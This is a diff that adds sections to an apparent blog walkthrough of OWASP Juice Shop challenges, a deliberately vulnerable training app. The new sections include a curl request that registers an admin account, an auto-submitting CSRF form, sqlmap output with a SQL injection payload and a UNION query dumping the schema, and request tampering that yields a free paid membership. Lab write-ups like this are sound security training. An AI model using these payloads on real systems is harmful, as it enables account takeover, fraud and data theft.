@@ -436,6 +436,93 @@ rockyou. Running this attack on the free version is a bit slow but it works and 
 <blockquote>
 <p>Register as a user with administrator privileges.</p>
 </blockquote>
+<p>For this challenge all I had to do was submit a POST request to the API like so:</p>
+<p><code>curl -d '{&quot;email&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;}' -H 'Content-Type: application/json' https://owasp-juice-shop-pentesting.herokuapp.com/api/users/</code></p>
+<pre><code>{&quot;status&quot;:&quot;success&quot;,&quot;data&quot;:{&quot;username&quot;:&quot;&quot;,&quot;deluxeToken&quot;:&quot;&quot;,&quot;lastLoginIp&quot;:&quot;0.0.0.0&quot;,&quot;profileImage&quot;:&quot;/assets/public/images/uploads/defaultAdmin.png&quot;,&quot;isActive&quot;:true,&quot;id&quot;:21,&quot;email&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;updatedAt&quot;:&quot;2021-09-24T13:43:00.474Z&quot;,&quot;createdAt&quot;:&quot;2021-09-24T13:43:00.474Z&quot;,&quot;deletedAt&quot;:null}}  
+</code></pre><p>You successfully solved a challenge: Admin Registration (Register as a user with administrator privileges.)</p>
+<h5 id="bjoerns-favorite-pet">Bjoern&rsquo;s Favorite Pet</h5>
+<p>Category:  Broken Authentication</p>
+<blockquote>
+<p>Reset the password of Bjoern&rsquo;s OWASP account via the Forgot Password mechanism with the original answer to his security question.</p>
+</blockquote>
+<p>The hint for this suggests looking up Bjorn. I quickly found he has a youtube channel that looks interesting and the information I need is likely there given the that the playlist is called &ldquo;OWASP Juice Shop&rdquo;, <a href="https://www.youtube.com/playlist?list=PLV9O4rIovHhO1y8_78GZfMbH6oznyx2g2">https://www.youtube.com/playlist?list=PLV9O4rIovHhO1y8_78GZfMbH6oznyx2g2</a>. But there are 110 videos here! I started at the bottom of the list as this is likely to be an early recording and going through the titles to check for ones that stand out or seem like they might hold the key I eventually came across <a href="https://www.youtube.com/watch?v=Lu0-kDdtVf4">https://www.youtube.com/watch?v=Lu0-kDdtVf4</a> (81 on the list).</p>
+<p>This is the introduction video to Juice Shop. Around 4 mins into the video he creates an account <code>bjoern@owasp.org</code> and chooses Name of your favorite pet? as his security question with the answer being <code>Zaya</code>.</p>
+<p>With this information I headed to the login page and chose &ldquo;Forgot your password?&rdquo; and tested the information from the video. Sure enough this account still existed using this information.</p>
+<p>You successfully solved a challenge: Bjoern&rsquo;s Favorite Pet (Reset the password of Bjoern&rsquo;s OWASP account via the Forgot Password mechanism with the original answer to his security question.)</p>
+<h5 id="captcha-bypass">CAPTCHA Bypass</h5>
+<p>Category:  Broken Anti Automation</p>
+<blockquote>
+<p>Submit 10 or more customer feedbacks within 10 seconds.</p>
+</blockquote>
+<p>I already ran into the CAPTCHA section early on in the Customer Feedback section so I immediately head there. Next I inspect the page and go to the network tab to check for the CAPTCHA request and found <a href="https://example.herokuapp.com/rest/captcha/">https://example.herokuapp.com/rest/captcha/</a>.</p>
+<pre><code>captchaId	2
+captcha	&quot;6*1+8&quot;
+answer	&quot;14&quot;
+</code></pre><p>When I submit feedback I see a POST call to /api/Feedback with the information:</p>
+<pre><code>captcha	&quot;14&quot;
+captchaId	2
+comment	&quot;test (***in@juice-sh.op)&quot;
+rating	1
+UserId	1
+</code></pre><p>So I open up Burp and capture a request to the /api/Feedback and send it to repeat to simply spam send and complete this challenge.</p>
+<p>You successfully solved a challenge: CAPTCHA Bypass (Submit 10 or more customer feedbacks within 10 seconds.)</p>
+<h5 id="csrf">CSRF</h5>
+<p>Category:  Broken Access Control</p>
+<blockquote>
+<p>Change the name of a user by performing Cross-Site Request Forgery from another origin.</p>
+</blockquote>
+<p>For this challenge I used Real-Time HTML Editor at <a href="http://htmledit.squarefree.com/">http://htmledit.squarefree.com/</a> and ran the following code:</p>
+<pre><code>&lt;form action=&quot;https://exampleapp.herokuapp.com/profile&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;username&quot; value=&quot;CSRF&quot;/&gt;
+  &lt;input type=&quot;submit&quot;/&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+</code></pre><p>The challenge completed without the successful message I usually get but I could also verify its success by going to <a href="https://exampleapp.herokuapp.com/profile">https://exampleapp.herokuapp.com/profile</a> and seeing that the username and indeed been changed to CSRF.</p>
+<h5 id="client-side-xss-protection">Client-side XSS Protection</h5>
+<p>Unavailable on the Heroku environment.</p>
+<h5 id="database-schema">Database Schema</h5>
+<p>Category: Injection</p>
+<blockquote>
+<p>Exfiltrate the entire DB schema definition via SQL Injection.</p>
+</blockquote>
+<p>From an earlier challenge (DOM XSS) I knew that there was no input sanitization on the “Search” field, so I decided to start there. Running sqlmap -u <a href="https://exampleapp.herokuapp.com/rest/products/search?q=">https://exampleapp.herokuapp.com/rest/products/search?q=</a> &ndash;dbs &ndash;level=3 &ndash;risk=3   quickly tells us this is an SQLite database we are dealing with.</p>
+<pre><code>sqlmap identified the following injection point(s) with a total of 1383 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=') AND 6959=6959 AND ('KGhU' LIKE 'KGhU
+---
+[19:46:31] [INFO] testing SQLite
+[19:46:31] [INFO] confirming SQLite
+[19:46:32] [INFO] actively fingerprinting SQLite
+[19:46:32] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[19:46:32] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
+</code></pre><p>Cool its vulnerable. I was able to rerun sqlmap with <code>--tables</code> and retrieve the database <code>SQLite_masterdb</code> as well as all the table but the challenge did not complete. Nonetheless I made a copy of the results and saved it some place ill remember in case its useful later on. Doing this the manual way really took some time as at first I thought we had to enumerate all 20 tables that sqlmap found but apparently it was just 9.</p>
+<p><code>https://exampleapp.herokuapp.com/rest/products/search?q=qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--</code></p>
+<p>You successfully solved a challenge: Database Schema (Exfiltrate the entire DB schema definition via SQL Injection.)</p>
+<h5 id="deluxe-fraud">Deluxe Fraud</h5>
+<p>Category: Improper Input Validation</p>
+<blockquote>
+<p>Obtain a Deluxe Membership without paying for it.</p>
+</blockquote>
+<p>I headed to <a href="https://exampleapp.herokuapp.com/#/payment/deluxe">https://exampleapp.herokuapp.com/#/payment/deluxe</a> and started up Burp to see if I could get an easy win intercepting a request but didn&rsquo;t find anything useful there. So I inspected the <code>pay using wallet</code> button and removed both codes that mentioned disabled (<code>mat-button-disabled</code> and <code>disabled=&quot;true&quot;</code>). After that I clicked the now enabled button and <code>continue</code> then checked the network tab of devtools. There is a POST request sent, which only contains one parameter in the request payload, &ldquo;paymentMode&rdquo;, which is set to &ldquo;wallet&rdquo;. I right clicked the POST request itself on the network tab list and selected to edit and resent. I changed the <code>&quot;wallet&quot;</code> value to just <code>&quot;&quot;</code> and send.</p>
+<p>You successfully solved a challenge: Deluxe Fraud (Obtain a Deluxe Membership without paying for it.)</p>
+<h5 id="forged-feedback">Forged Feedback</h5>
+<p>Category: Broken Access Control</p>
+<blockquote>
+<p>Post some feedback in another users name.</p>
+</blockquote>
+<p>I completing this one accidentally while doing the CAPTCHA bypass challenge simply by being logged in as one of the users accounts that I had gained access to earlier on.</p>
+<p>The proper way to do this is to inspect the page and find the hidden element under <code>feedback-form</code>.</p>
+<p><code>&lt;input id=&quot;userId&quot; class=&quot;ng-untouched ng-pristine ng-valid&quot; hidden=&quot;&quot;&gt;</code></p>
+<p>Remove the <code>hidden</code> and you can change the userId to complete this challenge.</p>
+<h5 id="forged-review">Forged Review</h5>
+<p>Category: Broken Access Control</p>
+<blockquote>
+<p>Post a product review as another user or edit any user&rsquo;s existing review.</p>
+</blockquote>
 <h5 id="privacy-policy-inspection">Privacy Policy Inspection</h5>
 <p>Category:  Security through Obscurity</p>
 <blockquote>
@@ -576,6 +663,14 @@ rockyou. Running this attack on the free version is a bit slow but it works and 
               <ul>
                 <li><a href="#api-only-xss">API-only XSS</a></li>
                 <li><a href="#admin-registration">Admin Registration</a></li>
+                <li><a href="#bjoerns-favorite-pet">Bjoern&rsquo;s Favorite Pet</a></li>
+                <li><a href="#captcha-bypass">CAPTCHA Bypass</a></li>
+                <li><a href="#csrf">CSRF</a></li>
+                <li><a href="#client-side-xss-protection">Client-side XSS Protection</a></li>
+                <li><a href="#database-schema">Database Schema</a></li>
+                <li><a href="#deluxe-fraud">Deluxe Fraud</a></li>
+                <li><a href="#forged-feedback">Forged Feedback</a></li>
+                <li><a href="#forged-review">Forged Review</a></li>
                 <li><a href="#privacy-policy-inspection">Privacy Policy Inspection</a></li>
                 <li><a href="#heading"></a></li>
               </ul>
